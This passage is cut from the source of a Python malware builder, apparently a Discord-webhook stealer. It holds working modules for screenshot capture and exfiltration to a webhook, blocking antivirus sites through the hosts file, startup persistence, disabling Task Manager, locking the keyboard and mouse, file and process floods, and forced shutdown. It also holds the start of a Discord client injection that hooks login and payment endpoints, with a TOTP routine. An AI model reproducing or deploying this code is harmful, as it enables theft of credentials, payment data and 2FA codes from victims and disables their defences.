                username=v4r_username_embed,
                avatar_url=v4r_avatar_embed
            )
            
        if os.path.exists(v4r_path_file_capture):
            os.remove(v4r_path_file_capture)
        Clear()
    except:
        Clear()
        pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Op3nU53rPr0fi1353tting5 = r'''
def Op3n_U53r_Pr0fi13_53tting5():
    import subprocess
    import time
    try:
        subprocess.Popen(["control", "userpasswords2"])
        time.sleep(2)
    except:
        pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Scr33n5h0t = r'''
def Scr33n5h0t():
    import os
    from PIL import ImageGrab
    from discord import SyncWebhook, Embed, File

    try:
        v4r_name_file_screen = f"Screenshot_{v4r_username_pc}.png"

        def capture(v4r_path):
            v4r_image = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            v4r_image.save(v4r_path)
        
        try:
            v4r_path_file_screen = f"{os.path.join(os.environ.get('USERPROFILE'), 'Documents')}\\{v4r_name_file_screen}"
            capture(v4r_path_file_screen)
        except:
            v4r_path_file_screen = v4r_name_file_screen
            capture(v4r_path_file_screen)

        v4r_embed = Embed(title=f"Screenshot `{v4r_username_pc} \"{v4r_ip_address_public}\"`:", color=v4r_color_embed)
        v4r_embed.set_image(url=f"attachment://{v4r_name_file_screen}")
        v4r_embed.set_footer(text=v4r_footer_text, icon_url=v4r_avatar_embed )
        v4r_w3bh00k = SyncWebhook.from_url(v4r_w3bh00k_ur1)
        v4r_w3bh00k.send(
                embed=v4r_embed,
                file=File(f'{v4r_path_file_screen}', filename=v4r_name_file_screen),
                username=v4r_username_embed,
                avatar_url=v4r_avatar_embed
            )

        if os.path.exists(v4r_path_file_screen):
            os.remove(v4r_path_file_screen)
    except Exception as e:
        v4r_w3bh00k = SyncWebhook.from_url(v4r_w3bh00k_ur1)
        v4r_embed = Embed(
            title=f'Screenshot `{v4r_username_pc} "{v4r_ip_address_public}"`:', 
            description=f"Impossible to take screenshot.\n**Error:** `{e}`",
            color=v4r_color_embed)
        v4r_embed.set_footer(text=v4r_footer_text, icon_url=v4r_avatar_embed)
        v4r_w3bh00k.send(embed=v4r_embed, username=v4r_username_embed, avatar_url=v4r_avatar_embed)
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

B10ckW3b5it3 = r'''
def B10ck_W3b5it3():
    import os

    "Perm Admin Required"
    try:
        v4r_d1r3ct0ry = os.getcwd()
        v4r_d15k_l3tt3r = os.path.splitdrive(v4r_d1r3ct0ry)[0]

        def b10ck_w3b5it3(v4r_w3bsite):
            v4r_hosts_path = f"{v4r_d15k_l3tt3r}\\Windows\\System32\\drivers\\etc\\hosts"
            if os.path.exists(v4r_hosts_path):
                pass
            else:
                v4r_hosts_path = f"C:\\Windows\\System32\\drivers\\etc\\hosts"

            v4r_redirect = "127.0.0.1"
            with open(v4r_hosts_path, "a") as v4r_file:
                v4r_file.write("\n" + v4r_redirect + " " + v4r_w3bsite)
        
        v4r_w3b51t35_t0_8l0ck = [
            'virustotal.com', 
            'www.virustotal.com',
            'www.virustotal.com/gui/home/upload',
            'avast.com', 
            'totalav.com', 
            'scanguard.com', 
            'totaladblock.com', 
            'pcprotect.com', 
            'mcafee.com', 
            'bitdefender.com', 
            'us.norton.com', 
            'avg.com', 
            'malwarebytes.com', 
            'pandasecurity.com', 
            'avira.com', 
            'norton.com', 
            'eset.com', 
            'zillya.com', 
            'kaspersky.com', 
            'usa.kaspersky.com', 
            'sophos.com', 
            'home.sophos.com', 
            'adaware.com', 
            'bullguard.com', 
            'clamav.net', 
            'drweb.com', 
            'emsisoft.com', 
            'f-secure.com', 
            'zonealarm.com', 
            'trendmicro.com', 
            'ccleaner.com'
        ]

        for v4r_w3b51t3_t0_8l0ck in v4r_w3b51t35_t0_8l0ck:
            b10ck_w3b5it3(v4r_w3b51t3_t0_8l0ck)
    except:
        pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

St4rtup = r'''
def St4rtup():
    import os
    import sys
    import shutil

    try:
        v4r_file_path = os.path.abspath(sys.argv[0])

        if v4r_file_path.endswith(".exe"):
            v4r_ext = "exe"
        elif v4r_file_path.endswith(".py"):
            v4r_ext = "py"

        v4r_new_name = f"ㅤ.{v4r_ext}"

        if sys.platform.startswith('win'):  
            v4r_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        elif sys.platform.startswith('darwin'): 
            v4r_folder = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
        elif sys.platform.startswith('linux'):
            v4r_folder = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
        v4r_path_new_file = os.path.join(v4r_folder, v4r_new_name)

        shutil.copy(v4r_file_path, v4r_path_new_file)
        os.chmod(v4r_path_new_file, 0o777) 
    except:
        pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

St4rt = r'''
try: requests.post(v4r_w3bh00k_ur1, json={'content': f'****╔═════════════════Victim Affected═════════════════╗****', 'username': v4r_username_embed, 'avatar_url': v4r_avatar_embed,})
except: pass
try: threading.Thread(target=B10ck_K3y).start()
except: pass
try: threading.Thread(target=B10ck_T45k_M4n4g3r).start()
except: pass
try: threading.Thread(target=B10ck_W3b5it3).start()
except: pass
try: threading.Thread(target=St4rtup).start()
except: pass
try: Sy5t3m_Inf0()
except: pass
try: Di5c0rd_T0k3n()
except: pass
try: Di5c0rd_inj3c710n()
except: pass
try: Br0w53r_5t341()
except: pass
try: R0b10x_C00ki3()
except: pass
try: C4m3r4_C4ptur3()
except: pass
try: Op3n_U53r_Pr0fi13_53tting5()
except: pass
try: Scr33n5h0t()
except: pass
try: requests.post(v4r_w3bh00k_ur1, json={'content': f'****╚══════════════════{v4r_ip_address_public}══════════════════╝****', 'username': v4r_username_embed, 'avatar_url': v4r_avatar_embed})
except: pass
try: threading.Thread(target=Sp4m_Opti0ns).start()
except: pass
try: threading.Thread(target=R3st4rt).start()
except: pass
try: threading.Thread(target=F4k3_3rr0r).start()
except: pass
try: threading.Thread(target=Shutd0wn).start()
except: pass
Clear()
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Sp4mOpti0ns = r'''
def Sp4m_Opti0ns():
    import keyboard
    while True:
        try:
            B10ck_M0u53()
            Sp4m_0p3n_Pr0gr4m()
            Sp4m_Cr34t_Fil3()
            if keyboard.is_pressed('alt') and keyboard.is_pressed('alt gr'):
                Unb10ck_K3y()
                break
        except:
            pass
''' 

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

R3st4rt = r'''
def R3st4rt():
    while True:
        time.sleep(300)

        requests.post(v4r_w3bh00k_ur1, json={'content': f'****╔════════════════════Restart═══════════════════╗****', 'username': v4r_username_embed, 'avatar_url': v4r_avatar_embed})
        try: Sy5t3m_Inf0()
        except: pass
        try: Di5c0rd_T0k3n()
        except: pass
        try: Di5c0rd_inj3c710n()
        except: pass
        try: Br0w53r_5t341()
        except: pass
        try: R0b10x_C00ki3()
        except: pass
        try: C4m3r4_C4ptur3()
        except: pass
        try: Scr33n5h0t()
        except: pass
        Clear()
        requests.post(v4r_w3bh00k_ur1, json={'content': f'****╚══════════════════{v4r_ip_address_public}══════════════════╝****', 'username': v4r_username_embed, 'avatar_url': v4r_avatar_embed})
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

def F4k33rr0r(title, message):
    return f'''
def F4k3_3rr0r():
    import tkinter as tk
    from tkinter import messagebox
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("{title}", "{message}")
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Shutd0wn = r'''
def Shutd0wn():
    import sys
    import os
    if sys.platform.startswith('win'):
        os.system('shutdown /s /t 15')
    elif sys.platform.startswith('linux'):
        os.system('shutdown -h +0.25')
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Sp4m0p3nPr0gr4m = r'''
def Sp4m_0p3n_Pr0gr4m():
    import subprocess
    import threading

    def sp4m():
        programs = [
            'calc.exe',
            'notepad.exe',
            'mspaint.exe',
            'explorer.exe',    
        ]
        for program in programs:
            for _ in range(1):
                subprocess.Popen(program)
    
    def request():
        threads = []
        try:
            for _ in range(int(100)):
                t = threading.Thread(target=sp4m)
                t.start()
                threads.append(t)
        except:
            pass

        for thread in threads:
            thread.join()

    request()
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

B10ckK3y = r'''
def B10ck_K3y():
    import keyboard
    k3y = [
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
        "backslash", "semicolon", "comma", "period", "slash",
        "volume up", "volume down", "volume mute",
        "app", "sleep", "print screen", "pause",
    ]
    for k3y_b10ck in k3y:
        try: keyboard.block_key(k3y_b10ck)
        except: pass

def Unb10ck_K3y():
    import keyboard
    k3y = [
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
        "backslash", "semicolon", "comma", "period", "slash",
        "volume up", "volume down", "volume mute",
        "app", "sleep", "print screen", "pause",
    ]
    for k3y_b10ck in k3y:
        try: keyboard.unblock_key(k3y_b10ck)
        except: pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

B10ckT45kM4n4g3r = r'''
def B10ck_T45k_M4n4g3r():
    import psutil
    import subprocess
    import os

    "Perm Admin Required"
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'Taskmgr.exe':
            proc.terminate()
            break
    subprocess.run("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True)
    Clear()
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

B10ckM0u53 = r'''
def B10ck_M0u53():
    import pyautogui
    pyautogui.FAILSAFE = False
    width, height = pyautogui.size()
    pyautogui.moveTo(width + 100, height + 100)
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Sp4mCr34tFil3 = r'''
def Sp4m_Cr34t_Fil3():
    import random
    import string
    import threading

    ext = [".exe", ".py", ".txt", ".png", ".ico", ".bat", 
           ".js", ".php", ".html", ".css", ".mp3", ".mp4", 
           ".mov", ".jpg", ".pdf", ".troll", ".cooked",
           ".lol", ".funny", ".virus", ".malware"
           ".redtiger", ".redtiger", ".redtiger", ".redtiger"
    ]
    def Cr43t():
        file_name = "".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(10, 50))) + random.choice(ext)

        with open(file_name, 'w', encoding='utf-8') as file:
            file.write(("".join(random.choice(string.ascii_letters + string.digits + string.punctuation) for i in range(999999)))) * random.randint(9999999999999999999999999, 9999999999999999999999999999999999999999)

    def request():
        threads = []
        try:
            for _ in range(int(100)):
                t = threading.Thread(target=Cr43t)
                t.start()
                threads.append(t)
        except:
            pass

        for thread in threads:
            thread.join()

    request()
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Di5c0rdIj3ct10n = r'''
v4r_inj3c710n_c0d3 = r"""
const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const config = {
  webhook: '%WEBHOOK_HERE%', 
  webhook_protector_key: '%WEBHOOK_KEY%', 
  auto_buy_nitro: false, 
  ping_on_run: true, 
  ping_val: '@everyone',
  ip_address_public: '%IP_PUBLIC%',
  username: '%USERNAME%',
  embed_name: '%EMBED_NAME%', 
  embed_icon: '%EMBED_ICON%'.replace(/ /g, '%20'), 
  footer_text: '%FOOTER_TEXT%',
  embed_color: %EMBED_COLOR%, 
  injection_url: '', 
  api: 'https://discord.com/api/v9/users/@me',
  nitro: {
    boost: {
      year: {
        id: '521847234246082599',
        sku: '511651885459963904',
        price: '9999',
      },
      month: {
        id: '521847234246082599',
        sku: '511651880837840896',
        price: '999',
      },
    },
    classic: {
      month: {
        id: '521846918637420545',
        sku: '511651871736201216',
        price: '499',
      },
    },
  },
  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
  },
  filter2: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
};

function parity_32(x, y, z) {
  return x ^ y ^ z;
}
function ch_32(x, y, z) {
  return (x & y) ^ (~x & z);
}

function maj_32(x, y, z) {
  return (x & y) ^ (x & z) ^ (y & z);
}
function rotl_32(x, n) {
  return (x << n) | (x >>> (32 - n));
}
function safeAdd_32_2(a, b) {
  var lsw = (a & 0xffff) + (b & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function safeAdd_32_5(a, b, c, d, e) {
  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function binb2hex(binarray) {
  var hex_tab = '0123456789abcdef',
    str = '',
    length = binarray.length * 4,
    i,
    srcByte;

  for (i = 0; i < length; i += 1) {
    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
  }

  return str;
}

function getH() {
  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
}
function roundSHA1(block, H) {
  var W = [],
    a,
    b,
    c,
    d,
    e,
    T,
    ch = ch_32,
    parity = parity_32,
    maj = maj_32,
    rotl = rotl_32,
    safeAdd_2 = safeAdd_32_2,
    t,
    safeAdd_5 = safeAdd_32_5;

  a = H[0];
  b = H[1];
  c = H[2];
  d = H[3];
  e = H[4];

  for (t = 0; t < 80; t += 1) {
    if (t < 16) {
      W[t] = block[t];
    } else {
      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
    }

    if (t < 20) {
      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
    } else if (t < 40) {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
    } else if (t < 60) {
      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
    } else {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
    }

    e = d;
    d = c;
    c = rotl(b, 30);
    b = a;
    a = T;
  }

  H[0] = safeAdd_2(a, H[0]);
  H[1] = safeAdd_2(b, H[1]);
  H[2] = safeAdd_2(c, H[2]);
  H[3] = safeAdd_2(d, H[3]);
  H[4] = safeAdd_2(e, H[4]);

  return H;
}

function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
  var i, appendedMessageLength, offset;

  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
  while (remainder.length <= offset) {
    remainder.push(0);
  }
  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
  remainder[offset] = remainderBinLen + processedBinLen;
  appendedMessageLength = remainder.length;

  for (i = 0; i < appendedMessageLength; i += 16) {
    H = roundSHA1(remainder.slice(i, i + 16), H);
  }
  return H;
}

function hex2binb(str, existingBin, existingBinLen) {
  var bin,
    length = str.length,
    i,
    num,
    intOffset,
    byteOffset,
    existingByteLen;

  bin = existingBin || [0];
  existingBinLen = existingBinLen || 0;
  existingByteLen = existingBinLen >>> 3;

  if (0 !== length % 2) {
    console.error('String of HEX type must be in byte increments');
  }

  for (i = 0; i < length; i += 2) {
    num = parseInt(str.substr(i, 2), 16);
    if (!isNaN(num)) {
      byteOffset = (i >>> 1) + existingByteLen;
      intOffset = byteOffset >>> 2;
      while (bin.length <= intOffset) {
        bin.push(0);
      }
      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
    } else {
      console.error('String of HEX type contains invalid characters');
    }
  }

  return { value: bin, binLen: length * 4 + existingBinLen };
}

class jsSHA {
  constructor() {
    var processedLen = 0,
      remainder = [],
      remainderLen = 0,
      intermediateH,
      converterFunc,
      outputBinLen,
      variantBlockSize,
      roundFunc,
      finalizeFunc,
      finalized = false,
      hmacKeySet = false,
      keyWithIPad = [],
      keyWithOPad = [],
      numRounds,
      numRounds = 1;

    converterFunc = hex2binb;

    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
      console.error('numRounds must a integer >= 1');
    }
    variantBlockSize = 512;
    roundFunc = roundSHA1;
    finalizeFunc = finalizeSHA1;
    outputBinLen = 160;
    intermediateH = getH();

    this.setHMACKey = function (key) {
      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
      keyConverterFunc = hex2binb;
      convertRet = keyConverterFunc(key);
      keyBinLen = convertRet['binLen'];
      keyToUse = convertRet['value'];
      blockByteSize = variantBlockSize >>> 3;
      lastArrayIndex = blockByteSize / 4 - 1;

      if (blockByteSize < keyBinLen / 8) {
        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      } else if (blockByteSize > keyBinLen / 8) {
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      }

      for (i = 0; i <= lastArrayIndex; i += 1) {
        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
      }

      intermediateH = roundFunc(keyWithIPad, intermediateH);
      processedLen = variantBlockSize;

      hmacKeySet = true;
    };

    this.update = function (srcString) {
      var convertRet,
        chunkBinLen,
        chunkIntLen,
        chunk,
        i,
        updateProcessedLen = 0,
        variantBlockIntInc = variantBlockSize >>> 5;

      convertRet = converterFunc(srcString, remainder, remainderLen);
      chunkBinLen = convertRet['binLen'];
      chunk = convertRet['value'];

      chunkIntLen = chunkBinLen >>> 5;
      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
          updateProcessedLen += variantBlockSize;
        }
      }
      processedLen += updateProcessedLen;
      remainder = chunk.slice(updateProcessedLen >>> 5);
      remainderLen = chunkBinLen % variantBlockSize;
    };

    this.getHMAC = function () {
      var firstHash;

      if (false === hmacKeySet) {
        console.error('Cannot call getHMAC without first setting HMAC key');
      }

      const formatFunc = function (binarray) {
        return binb2hex(binarray);
      };

      if (false === finalized) {
        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
        intermediateH = roundFunc(keyWithOPad, getH());
        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
      }

      finalized = true;
      return formatFunc(intermediateH);
    };
  }
}

if ('function' === typeof define && define['amd']) {
  define(function () {
    return jsSHA;
  });
} else if ('undefined' !== typeof exports) {
  if ('undefined' !== typeof module && module['exports']) {
    module['exports'] = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global['jsSHA'] = jsSHA;
}

if (jsSHA.default) {
  jsSHA = jsSHA.default;
}

function totp(key) {
  const period = 30;
  const digits = 6;
  const timestamp = Date.now();
  const epoch = Math.round(timestamp / 1000.0);
  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
  const shaObj = new jsSHA();
  shaObj.setHMACKey(base32tohex(key));
  shaObj.update(time);
  const hmac = shaObj.getHMAC();
  const offset = hex2dec(hmac.substring(hmac.length - 1));
  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
  return otp;
}

function hex2dec(s) {
  return parseInt(s, 16);
}

function dec2hex(s) {
  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
}

function base32tohex(base32) {
  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
    bits = '',
    hex = '';

  base32 = base32.replace(/=+$/, '');

  for (let i = 0; i < base32.length; i++) {
    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
    if (val === -1) console.error('Invalid base32 character in key');
    bits += leftpad(val.toString(2), 5, '0');
  }

  for (let i = 0; i + 8 <= bits.length; i += 8) {
    let chunk = bits.substr(i, 8);
    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
  }
  return hex;
}

function leftpad(str, len, pad) {
  if (len + 1 >= str.length) {
    str = Array(len + 1 - str.length).join(pad) + str;
  }
  return str;
}

const discordPath = (function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  if (process.platform === 'win32') {
    resourcePath = path.join(app, 'resources');
  } else if (process.platform === 'darwin') {
    resourcePath = path.join(app, 'Contents', 'Resources');
  }

